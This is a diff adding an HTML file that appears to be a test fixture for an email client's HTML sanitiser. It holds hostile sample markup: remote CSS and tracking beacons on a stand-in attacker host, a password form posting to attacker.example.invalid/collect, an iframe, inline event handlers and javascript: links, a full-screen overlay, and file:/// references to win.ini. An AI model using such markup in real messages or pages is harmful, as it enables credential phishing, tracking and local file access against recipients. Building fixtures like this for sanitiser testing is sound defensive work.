@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+  <head>
+    <link rel="stylesheet" href="https://attacker.example.invalid/mail.css">
+    <style>
+      @import url("https://attacker.example.invalid/import.css");
+      .overlay { position: fixed; inset: 0; z-index: 2147483647; background-image: url("https://attacker.example.invalid/beacon.gif"); }
+    </style>
+  </head>
+  <body onload="alert('loaded')">
+    <script>globalThis.__nextmailCompromised = true;</script>
+    <form action="https://attacker.example.invalid/collect"><input name="password"><button type="submit">Continue</button></form>
+    <iframe src="https://attacker.example.invalid/frame"></iframe>
+    <object data="file:///C:/Windows/win.ini"></object>
+    <a href="javascript:alert('clicked')" onclick="alert('clicked')">Unsafe action</a>
+    <a href="file:///C:/Windows/win.ini">Unsafe local file</a>
+    <div class="overlay" style="position:fixed;background-image:url(https://attacker.example.invalid/inline.gif)">Visible inert fixture text</div>
+    <img src="https://attacker.example.invalid/tracker.gif" onerror="alert('image')" alt="Remote image">
+  </body>
+</html>
